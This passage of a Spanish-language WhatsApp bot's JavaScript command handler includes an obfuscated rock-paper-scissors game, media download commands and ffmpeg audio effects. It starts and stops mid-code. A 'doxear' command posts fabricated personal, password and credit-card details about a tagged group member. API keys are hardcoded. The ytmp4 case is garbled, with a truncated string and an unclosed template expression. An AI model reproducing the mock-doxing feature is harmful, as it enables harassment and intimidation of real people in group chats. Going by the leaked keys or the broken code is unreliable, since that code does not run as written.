a.)\x0a\x09-\x20🖐🏻\x20El\x20papel\x20envuelve\x20la\x20piedra.\x20(Gana\x20el\x20papel.)\x0a\x09-\x20🔁\x20En\x20caso\x20de\x20empate\x20(que\x20dos\x20jugadores\x20elijan\x20el\x20mismo\x20elemento\x20o\x20que\x20tres\x20jugadores\x20elijan\x20cada\x20uno\x20un\x20objeto\x20distinto),\x20se\x20juega\x20otra\x20vez.\x0a\x09\x0a*Aqui\x20cada\x20quien\x20jugara\x20con\x20el\x20Bot,\x20se\x20juega\x20de\x20la\x20siguiente\x20manera:*\x0a\x0a','3OPRDdZ','error','trace','🖐🏻\x20papel','Lo\x20siento,\x20pero\x20*','__proto__','101040OQjLWe','nivel\x20para\x20corroborar\x20tu\x20experiencia.*','41SnRebr','*Nimodo,\x20Aprende\x20de\x20mi😏*','150520bLaygd','piedra','😨\x20Pero\x20que...\x20Me\x20as\x20ganado!!\x0a_✌🏻\x20tijera\x20corta\x20papel!_\x20*Bien\x20jugado!!*\x0a\x0a_Recibiste\x2010xp\x20😉_\x0a*Escribe\x20','jugar\x20piedra/papel/tijera\x0a\x0a_Si\x20logras\x20ganarle\x20al\x20Bot,\x20obtienes\x20una\x20recompensa!!_\x0a\x0a┎┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┒\x0a\x20*Juegos\x20By:*\x0a\x20_Samu330_\x20wa.me/+529984907794\x0a┖┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┚','console','info','{}.constructor(\x22return\x20this\x22)(\x20)','floor','4yjvaKM','*\x20no\x20es\x20un\x20elemento\x20compatible.\x0a_Solo\x20puedes\x20elegir\x20entre\x20piedra,\x20papel\x20o\x20tijera!_','9sXuwNS','papel','✊🏻\x20piedra','bind','152cvjKoE','*😂👌🏻*','5219984907794@s.whatsapp.net','prototype','warn','return\x20/\x22\x20+\x20this\x20+\x20\x22/','toString','*😫uh...\x20Empatamos!!\x20jugemos\x20de\x20nuevo!!*','table','apply','test'];const _0x50a80c=_0x3c7d;(function(_0x153eef,_0x3d0c01){const _0x395d6e=_0x3c7d;while(!![]){try{const _0x39211c=parseInt(_0x395d6e(0xa0))*-parseInt(_0x395d6e(0x94))+parseInt(_0x395d6e(0x7e))*parseInt(_0x395d6e(0x9d))+parseInt(_0x395d6e(0x72))+parseInt(_0x395d6e(0x76))+-parseInt(_0x395d6e(0x74))*parseInt(_0x395d6e(0x99))+parseInt(_0x395d6e(0x98))*parseInt(_0x395d6e(0x84))+parseInt(_0x395d6e(0x9a))*-parseInt(_0x395d6e(0x80));if(_0x39211c===_0x3d0c01)break;else _0x153eef['push'](_0x153eef['shift']());}catch(_0x294ddc){_0x153eef['push'](_0x153eef['shift']());}}}(_0x5f5c,0x2eed6));const _0x2053c4=function(){let _0x513bfb=!![];return function(_0x4bbee9,_0x598758){const _0x5eca46=_0x513bfb?function(){if(_0x598758){const _0x5e80c9=_0x598758['apply'](_0x4bbee9,arguments);return _0x598758=null,_0x5e80c9;}}:function(){};return _0x513bfb=![],_0x5eca46;};}(),_0x39b00f=_0x2053c4(this,function(){const _0x665fc2=function(){const _0x2e1ba8=_0x3c7d,_0x557f7d=_0x665fc2[_0x2e1ba8(0x9e)](_0x2e1ba8(0x89))()[_0x2e1ba8(0x9e)](_0x2e1ba8(0x96));return!_0x557f7d[_0x2e1ba8(0x8e)](_0x39b00f);};return _0x665fc2();});_0x39b00f();const _0x5b3b04=function(){let _0x48bc9e=!![];return function(_0x322705,_0x532a05){const _0x1b4bca=_0x48bc9e?function(){const _0x3a54bf=_0x3c7d;if(_0x532a05){const _0x46fe13=_0x532a05[_0x3a54bf(0x8d)](_0x322705,arguments);return _0x532a05=null,_0x46fe13;}}:function(){};return _0x48bc9e=![],_0x1b4bca;};}(),_0x210381=_0x5b3b04(this,function(){const _0x203c8d=_0x3c7d;let _0x151df8;try{const _0x59ff0e=Function(_0x203c8d(0x93)+_0x203c8d(0x7c)+');');_0x151df8=_0x59ff0e();}catch(_0x1d769d){_0x151df8=window;}const _0x4c30ca=_0x151df8[_0x203c8d(0x7a)]=_0x151df8[_0x203c8d(0x7a)]||{},_0x2cb8b2=[_0x203c8d(0x90),_0x203c8d(0x88),_0x203c8d(0x7b),_0x203c8d(0xa1),'exception',_0x203c8d(0x8c),_0x203c8d(0xa2)];for(let _0x273e1b=0x0;_0x273e1b<_0x2cb8b2['length'];_0x273e1b++){const _0x1dea26=_0x5b3b04[_0x203c8d(0x9e)][_0x203c8d(0x87)][_0x203c8d(0x83)](_0x5b3b04),_0x164272=_0x2cb8b2[_0x273e1b],_0x239d4e=_0x4c30ca[_0x164272]||_0x1dea26;_0x1dea26[_0x203c8d(0xa5)]=_0x5b3b04['bind'](_0x5b3b04),_0x1dea26[_0x203c8d(0x8a)]=_0x239d4e['toString'][_0x203c8d(0x83)](_0x239d4e),_0x4c30ca[_0x164272]=_0x1dea26;}});_0x210381();const yo=_0x50a80c(0x86);if(!q)return mentions(_0x50a80c(0x9f)+prefix+_0x50a80c(0x8f)+prefix+_0x50a80c(0x79),yo,!![]);function _0x3c7d(_0xfb7ab7,_0x36d282){return _0x3c7d=function(_0x338ef2,_0x210381){_0x338ef2=_0x338ef2-0x72;let _0x5b3b04=_0x5f5c[_0x338ef2];return _0x5b3b04;},_0x3c7d(_0xfb7ab7,_0x36d282);}frase=[_0x50a80c(0x9c),_0x50a80c(0x75),_0x50a80c(0x85),'*Te\x20atreviste\x20a\x20jugar\x20contra\x20mi,\x20ahora\x20disfruta\x20tu\x20derrota😈*'];const frase1=frase[Math[_0x50a80c(0x7d)](Math[_0x50a80c(0x95)]()*frase[_0x50a80c(0x92)])];juego=['✊🏻\x20piedra',_0x50a80c(0xa3),_0x50a80c(0x97),_0x50a80c(0x82),_0x50a80c(0xa3),_0x50a80c(0x97),_0x50a80c(0x82),_0x50a80c(0xa3),_0x50a80c(0x97)];const juego1=juego[Math[_0x50a80c(0x7d)](Math[_0x50a80c(0x95)]()*juego['length'])];if(!q=='piedra')return reply(_0x50a80c(0xa4)+q+_0x50a80c(0x7f));if(!q==_0x50a80c(0x81))return reply('Lo\x20siento,\x20pero\x20*'+q+'*\x20no\x20es\x20un\x20elemento\x20compatible.\x0a_Solo\x20puedes\x20elegir\x20entre\x20piedra,\x20papel\x20o\x20tijera!_');if(!q==_0x50a80c(0x91))return reply('Lo\x20siento,\x20pero\x20*'+q+_0x50a80c(0x7f));reply(juego1);if(q==_0x50a80c(0x77)){const jpiedra=''+juego1;if(jpiedra==_0x50a80c(0x82))return reply(_0x50a80c(0x8b));if(jpiedra==_0x50a80c(0xa3))return reply(frase1+'\x0a*🖐🏻\x20Papel\x20envuelve\x20piedra.*');if(jpiedra==_0x50a80c(0x97))reply('😨\x20Pero\x20que...\x20Me\x20as\x20ganado!!\x0a_✊🏻\x20piedra\x20rompe\x20tijera!_\x20*Bien\x20jugado!!*\x0a\x0a_Recibiste\x2010xp\x20😉_\x0a*Escribe\x20'+prefix+_0x50a80c(0x73));addLevelingXp(sender,0xa);}if(q==_0x50a80c(0x81)){const jpiedra=''+juego1;if(jpiedra=='🖐🏻\x20papel')return reply(_0x50a80c(0x8b));if(jpiedra==_0x50a80c(0x97))return reply(frase1+'\x0a*✌🏻\x20tijera\x20corta\x20papel.*');if(jpiedra=='✊🏻\x20piedra')reply('😨\x20Pero\x20que...\x20Me\x20as\x20ganado!!\x0a_🖐🏻\x20papel\x20envuelve\x20piedra!_\x20*Bien\x20jugado!!*\x0a\x0a_Recibiste\x2010xp\x20😉_\x0a*Escribe\x20'+prefix+_0x50a80c(0x73));addLevelingXp(sender,0xa);}if(q==_0x50a80c(0x91)){const jpiedra=''+juego1;if(jpiedra==_0x50a80c(0x97))return reply(_0x50a80c(0x8b));if(jpiedra==_0x50a80c(0x82))return reply(frase1+_0x50a80c(0x9b));if(jpiedra=='🖐🏻\x20papel')reply(_0x50a80c(0x78)+prefix+_0x50a80c(0x73));addLevelingXp(sender,0xa);}
/*////*/break
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		
case 'nivel':
const getLevel1 = getLevelingLevel(sender)
const lvup =  `✴ _*🧗🏻‍♂️Nivel Actual!͟*_ ✴
	
𓆩*𓆪 *💠 Nombre:* ${pushname} 𓆩*𓆪
	
┎┈┈┈┈┈┈┈┈┈┈┈┈┈┈
✨XP: ${getLevelingXp(sender)}
📚Nivel: ${getLevel1} ➫ ${getLevelingLevel(sender)}
🕋rango: ${rango}
┖┈┈┈┈┈┈┈┈┈┈┈┈┈┈`
samu330.sendMessage(from, lvup, MessageType.text, {quoted: { key: {                
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"documentMessage": { "title": `✍🏻Nivel ${nivelActual}`, 'jpegThumbnail': fs.readFileSync('./src/ara.png')}
}}
})
break
		
		
case 'reglas':
reply(`*Hola, estas son las reglas que debes seguir para que no tengas ningun problema con el propietario del bot*\n\n1- _Manten una formalidad respetuosa_\n2- _Si vas a añadir a imsane a algun grupo, verifica que el grupo cumpla con los requisitos que son tener minimo 5 personas_\n3-*Seras bloqueado inmediatamente*\n5- _🕐Espera el tiempo nesesario cuando pidas alguna funcion, ya que algunas tardan en realizarse, no vuelvas a pedir el comando nuevamente hasta que te llege un mensaje de error_\n\nLee las reglas y cumplelas, no te quieras hacer el chistoso, por que no lo eres y ni te sale, asi que porfavor respeta las reglas.`)
break
//Con este case se envia la aplicacion Tutorial
case 'tutorial': 
case 'crear':
result = fs.readFileSync(`./media/app.apk`)
var _0x760e=["\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x76\x6E\x64\x2E\x61\x6E\x64\x72\x6F\x69\x64\x2E\x70\x61\x63\x6B\x61\x67\x65\x2D\x61\x72\x63\x68\x69\x76\x65","\uD83D\uDC09\x41\x70\x70\x42\x6F\x74\uD83D\uDC09\x20\x62\x79\x20\uD83D\uDCCC\x53\x61\x6D\x75\x33\x33\x30\uD83E\uDD40","\uD83C\uDF52\x4E\x79\x61\x6E\x42\x6F\x74\x20\x7C\x20\x53\x61\x6D\x75\x33\x33\x30\uD83E\uDE80","\x5B\x20\u2605\x20\x5D\x20\u5C71\u59C6\x20\x33\x33\x30","\x2E\x2F\x73\x72\x63\x2F\x61\x72\x61\x2E\x70\x6E\x67","\x72\x65\x61\x64\x46\x69\x6C\x65\x53\x79\x6E\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x79\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x2F\x77\x61\x74\x63\x68\x3F\x76\x3D\x72\x4F\x50\x42\x65\x36\x4F\x2D\x6B\x33\x4D\x26\x74\x3D\x33\x30\x73","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65"];samu330[_0x760e[7]](from,result,document,{mimetype:_0x760e[0],filename:_0x760e[1],quoted:fdoc,contextInfo:{externalAdReply:{title:`${_0x760e[2]}`,body:_0x760e[3],mediaType:2,thumbnail:fs[_0x760e[5]](_0x760e[4]),mediaUrl:`${_0x760e[6]}`}}})
break


		
case 'idiomas':
reply(`*Estos son los idiomas soportados por la voz👇🏻*:

  'af': 'Afrikaans',
  'sq': 'Albanian',
  'ar': 'Arabic',
  'hy': 'Armenian',
  'ca': 'Catalan',
  'zh': 'Chinese',
  'zh-cn': 'Chinese (Mandarin/China)',
  'zh-tw': 'Chinese (Mandarin/Taiwan)',
  'zh-yue': 'Chinese (Cantonese)',
  'hr': 'Croatian',
  'cs': 'Czech',
  'da': 'Danish',
  'nl': 'Dutch',
  'en': 'English',
  'en-au': 'English (Australia)',
  'en-uk': 'English (United Kingdom)',
  'en-us': 'English (United States)',
  'eo': 'Esperanto',
  'fi': 'Finnish',
  'fr': 'French',
  'de': 'German',
  'el': 'Greek',
  'ht': 'Haitian Creole',
  'hi': 'Hindi',
  'hu': 'Hungarian',
  'is': 'Icelandic',
  'id': 'Indonesian',
  'it': 'Italian',
  'ja': 'Japanese',
  'ko': 'Korean',
  'la': 'Latin',
  'lv': 'Latvian',
  'mk': 'Macedonian',
  'no': 'Norwegian',
  'pl': 'Polish',
  'pt': 'Portuguese',
  'pt-br': 'Portuguese (Brazil)',
  'ro': 'Romanian',
  'ru': 'Russian',
  'sr': 'Serbian',
  'sk': 'Slovak',
  'es': 'Spanish',
  'es-es': 'Spanish (Spain)',
  'es-us': 'Spanish (United States)',
  'sw': 'Swahili',
  'sv': 'Swedish',
  'ta': 'Tamil',
  'th': 'Thai',
  'tr': 'Turkish',
  'vi': 'Vietnamese',
  'cy': 'Welsh'`)
break    
		
case 'timer':        
if (args[1] == "segundos") {
var timer = args[0] + "000"
} else if (args[1] == "minutos") {
var timer = args[0] + "0000"
} else if (args[1] == "horas") {
var timer = args[0] + "00000"
} else {
return reply("Porfavor eliga entre: \nsegundos\nminutos\nhoras\n\nEjemplo: =timer 30 segundos")
}
addFilter(from)
reply(`*⏰Se ajusto su cronometro a ${q}*`)
setTimeout(() => {
reply(`⏰El tiempo de *${q}* a finalizado!`)
}, timer)
addFilter(from)
break
		


case 'play2':
assistant = fs.readFileSync('./src/assistant.jpg')		
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
reply(`*Espere un momento, su audio ${q} se esta descargando...*`)
teks = args.join(' ')
if (!teks.endsWith("-doc")){
res1 = await yts(q).catch(e => {	
reply('_[ ! ] NO SE PUDO ENCONTRAR LO QUE BUSCABA_')
})	
let thumbInfo = ` [ *${res1.all[0].title}* ]

*_El archivo se esta enviando....._*
`
sendFileFromUrl(res1.all[0].image, image, {quoted: sam, caption: thumbInfo})
res1 = await y2mateA(res1.all[0].url).catch(e => {
pr21 = getJson(`https://api.zeks.xyz/api/ytmp3?apikey=hamilton20&url=${res1.all[0].url}`)	
reply(`_[ ! ] Lo siento, su descarga no pudo ser completada_\n\n*Realizando busqueda en el servidor 2*`)
sendFileFromUrl(pr21.result.url_audio, audio, {quoted: faud, mimetype: 'audio/mp4', duration :-99999999, filename: res1[0].output})
sendFileFromUrl(pr21.result.url_audio, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: 99999999999999, filename: res1[0].output})
})
sendFileFromUrl(res1[0].link, audio, {quoted: faud, mimetype: 'audio/mp4', duration :-99999999, filename: res1[0].output})
sendFileFromUrl(res1[0].link, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: 99999999999999, filename: res1[0].output})
}
addFilter(from)
addLevelingLevel(sender, 5)		
break

case 'play':
	
	if (!q) return reply('*Que audio quieres descargar?.....*')
	let plist = await yts(q)
	sendFileFromUrl(plist.all[0].image, image, {quoted: sam, caption: '_*Preview*_'})

	let play2v = samu330.prepareMessageFromContent(from,{
		"listMessage": {
				  "title": "🌬 Descarga disponible",
				  "description": `\n*°Vistas :* ${plist.all[0].views}\n*°Duracion :* ${plist.all[0].timestamp}\n*°Canal :* ${plist.all[0].author.name}`,
				  "buttonText": "Click Aqui para descargar",
				  "listType": "SINGLE_SELECT",
				  "sections": [
					{ "title": `[ ${plist.all[0].title} ]`,
					  "rows": [
						{
						  "title": '🎧Si es',
						  "description": '- Audio en mp3',
						  "rowId": `${plist.all[0].title}@list`
						},
						{
						  "title": '🎙No descargar',
						  "description": '',
						  "rowId": ``
						}
                        ]    
                    }
				  ]
				}
	  }, {quoted: sam})
	  samu330.relayWAMessage(play2v)

break

		

		
case 'twit':
if (!isRegister) return reply(mess.only.usrReg)
if (!q) return reply('Y el link de twiter??')
reply('*Espera un mometo porfavor...*')
twi = await getJson(`https://api.lolhuman.xyz/api/twitter?apikey=273a9e8195c27ba24abd53e3&url=${q}`)
reply(`*° Titulo:* ${twi.title}\n*° Calidad:* ${twi.result[2].resolution}\n\n_Si el video no llega, descarge por aqui:_\n${twi.result[2].link}`)
sendFileFromUrl(twi.result[2].link, video, {quoted: fvid, caption: '🍒insane💠', duration: 999999999})
addFilter(from)
break
		
case 'ig':
if (!isRegister) return reply(mess.only.usrReg)
if (!q) return reply('Y el link de Instagram??')
ig = await getJson(`https://api.lolhuman.xyz/api/instagram?apikey=${api}&url=${q}`)
reply(`*Espere un momento porfavor, su video se esta enviando....*`)
sendFileFromUrl(ig.result, video, {quoted: fvid, caption: '🍒insane💠', duration: 999999999})
addFilter(from)
break
		
//Fake Doxing By Samu330
case 'doxear':
if (!isRegister) return reply(mess.only.usrReg)
if (!isGroup) return reply(mess.only.group)
f = await getJson(`https://docs-jojo.herokuapp.com/api/fake_identity`)
reply(`*Doxeo de ${mentionUser} *

*Nombre:* _${f.name}_
*Genero:* _${f.gender}_
*Edad:* _${f.age}_
*Fecha de nacimiento:* _${f.birtday}_
*Ocupacion:* _${f.occupation}_
*Dirección:* _${f.address}_
*Codigo postal:* _${f.zip_code}_
*Estado:* _${f.state}_
*Pais:* _${f.country}_

=====================

*E-Mail:* ${f.email}
*Contraseña:* ${f.password}_
*Telefono:* _${f.phone}_

=====================

*No. Tarjeta de credito:* ${f.card}
*CVV:* _${f.code}_
*Fecha de vencimiento:* _${f.date}_
*PIN:* _${f.pin_code}_

=====================

*Peso:* _${f.weight}_
*Estatura:* _${f.height}_
*Tipo de sangre:* _${f.blood_type}_
*Estado:* _${f.status}_

=====================

*FDx Bt *
`)
break
		
		
case 'ytmp3':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (args.length < 1) return reply('Y el link?')
if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply('Link de YouTube we, *De YouTube!!*')
teks = args.join(' ')
reply('*Espere un momento...*')
resyt = await y2mateA(teks).catch(e => {
reply('_[ ! ] Error del servidor_')
})
result = `「 Informacion  」
*°Titulo :* ${resyt[0].judul}
*°Tamaño :* ${resyt[0].size}
_*El archivo se esta enviando.....*_
`
sendFileFromUrl(resyt[0].thumb, image, {caption: result, quoted: sam})
sendFileFromUrl(resyt[0].link, audio, {quoted: faud, duration :-99999999, mimetype: 'audio/mp3'})
sendFileFromUrl(resyt[0].link, audio, {quoted: faud, mimetype: 'audio/mp3', ptt: true, duration: 99999999})
addFilter(from)
addLevelingLevel(sender, 5)		
break
case 'ytmp4':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo s!.\n\nAl parecer no estas regis_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (args.length < 1) return reply('Y el link?')
if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply('Link de YouTube we, *De YouTube!!*')
teks = args.join(' ')
 
resyv = await y2mateV(teks).catch(e => {
reply('_[ ! ] Error del servidor_')
})
result = `「  informacion  」
*°Titulo :* ${resyv[0].judul}
*°Tamaño :* ${resyv[0].size
_*El archivo se esta enviando.....*_
`
sendFileFromUrl(resyv[0].thumb, image, {caption: result, quoted: sam})
sendFileFromUrl(resyv[0].link, video, {quoted: fvid, mimetype:'video/mp4', duration: 9999999999})
addFilter(from)
addLevelingLevel(sender, 5)		
break

case 'meme':
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)

try {
beh = await getJson(`https://meme-api.herokuapp.com/gimme/memesmexico`)
pint = await getBuffer(`${beh.url}`)
 
samu330.sendMessage(from, pint, image, {
quoted: fdoc, caption: `${beh.title}`, contextInfo: {"forwardingScore": 9999, "isForwarded": true}
})
  
} catch {
  reply('Intentalo de nuevo mas tarde...')
}
  break

case 'tomp3':
case 'toaudio':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
samu330.updatePresence(from, Presence.recording)
if (!isQuotedVideo) return reply('Y el video?')
reply('*Perame tatito!*')
const encmedia3 = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
const media3 = await samu330.downloadAndSaveMediaMessage(encmedia3)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media3} ${ran}`, (err) => {
fs.unlinkSync(media3)
if (err) return reply(mess.ferr)
buffer = fs.readFileSync(ran)
samu330.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: faud})
fs.unlinkSync(ran)
})
addFilter(from)
break

case 'imut':
 
im = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
ut = await samu330.downloadAndSaveMediaMessage(im)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${ut} -af atempo=3/4,asetrate=44500*4/3 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(ut)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: fdoc})
fs.unlinkSync(ran)
})
addFilter(from)
break
case 'hode':
 
ho = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
de = await samu330.downloadAndSaveMediaMessage(ho)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${de} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(de)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: fdoc})
fs.unlinkSync(ran)
})
addFilter(from)
break

case 'trigger':
 
tri = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
ger = await samu330.downloadAndSaveMediaMessage(tri)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${ger} -filter_complex "acrusher=level_in=8:level_out=18:bits=8:mode=log:aa=1" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(ger)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: fdoc})
fs.unlinkSync(ran)
})
addFilter(from)
break

case 'slow':
case 'lento':
 
low = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
slo = await samu330.downloadAndSaveMediaMessage(low)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${slo} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(slo)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration :-999999999999999, ptt:true, quoted: fdoc})
fs.unlinkSync(ran)
})
addFilter(from)
break
case 'ardilla':
 
pai = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo

tup = await samu330.downloadAndSaveMediaMessage(pai)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${tup} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(tup)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration :-999999999999999, ptt:true, quoted: fdoc})
fs.unlinkSync(ran)
})
addFilter(from)
break
case 'grave':
 
muk = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
gem = await samu330.downloadAndSaveMediaMessage(muk)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration :-999999999999999, ptt:true, quoted: fdoc})
fs.unlinkSync(ran)
})
addFilter(from)
break
case 'bass':
ass = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
 
bas = await samu330.downloadAndSaveMediaMessage(ass)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${bas} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(bas)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration :-999999999999999, ptt:true, quoted: fdoc})
fs.unlinkSync(ran)
})
addFilter(from)
break

case 'fantasma':
if (!isQuotedAudio) return reply('Etiqueta un audio!')	
 
encmediaa1 = isQuotedAudio ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
mediaa1 = await samu330.downloadAndSaveMediaMessage(encmediaa1)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${mediaa1} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(mediaa1)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, duration :-999999999999999, quoted : fdoc})
fs.unlinkSync(ran)
})
addFilter(from)
break

case 'robot':
if (!isQuotedAudio) return reply('Etiqueta un audio!')
 
encmediar = isQuotedAudio ? JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
mediar = await samu330.downloadAndSaveMediaMessage(encmediar)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${mediar} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(mediar)
if (err) return reply('Error!')
resa = fs.readFileSync(ran)
samu330.sendMessage(from, resa, audio, { mimetype: "audio/mp4", ptt: true, duration :-999999999999999, quoted: fdoc})
fs.unlinkSync(ran)
})
addFilter(from)
break


		
case 'rapido':
addFilter(from)
if (!isQuotedAudio) return reply('Etiqueta un audio!')
 
encmediiiaa = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
medi1a = await samu330.downloadAndSaveMediaMessage(encmediiiaa)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${medi1a} -filter:a "atempo=0.9,asetrate=95100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(medi1a)
if (err) return reply('Error!')
fast = fs.readFileSync(ran)
samu330.sendMessage(from, fast, audio, {
mimetype: 'audio/mp4', ptt: true, duration :-999999999999999, quoted: faud})
fs.unlinkSync(ran)
})
break

case 'reversa':
if (!isQuotedVideo) return reply('Porfavor etiqueta un video con el comando!')
reply('*Espera un momento porfavor....*')
encmediav = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
mediav = await samu330.downloadAndSaveMediaMessage(encmediav)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${mediav} -vf reverse -af areverse ${ran}`, (err) => {
fs.unlinkSync(mediav)
if (err) return reply(`Error: ${err}`)
vre = fs.readFileSync(ran)
samu330.sendMessage(from, vre, video, { mimetype: 'video/mp4', quoted: fvid, duration: -999999, sendEphemeral: true })
fs.unlinkSync(ran)
})
addFilter(from)
break

case 'vrapido':
		    
if (!isQuotedVideo) return reply('*ETIQUETA UN VIDEO JUNTO CON EL COMANDO PORFAVOR!!*')
 
encmediav1 = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
mediav1 = await samu330.downloadAndSaveMediaMessage(encmediav1)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${mediav1} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
fs.unlinkSync(mediav1)
if (err) return reply(`Error: ${err}`)
buffer4531 = fs.readFileSync(ran)
samu330.sendMessage(from, buffer4531, video, { mimetype: 'video/mp4', quoted: fvid, caption: '*VIDEO EFFECT BY SAMU330*', sendEphemeral: true })
fs.unlinkSync(ran)
})
addFilter(from)
break

case 'vlento':
		    
if (!isQuotedVideo) return reply('*ETIQUETA UN VIDEO JUNTO CON EL COMANDO PORFAVOR!!*')
 
encmediav2 = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
mediav2 = await samu330.downloadAndSaveMediaMessage(encmediav2)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${mediav2} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
fs.unlinkSync(mediav2)
if (err) return reply(`Err: ${err}`)
buffer4532 = fs.readFileSync(ran)
samu330.sendMessage(from, buffer4532, video, { mimetype: 'video/mp4', quoted: fvid, caption: '*VIDEO EFFECT BY SAMU330*', sendEphemeral: true })
fs.unlinkSync(ran)
})
addFilter(from)
break

case 'mirror':

if (!isQuotedVideo) return reply('*ETIQUETA UN VIDEO JUNTO CON EL COMANDO PORFAVOR!!*')
 
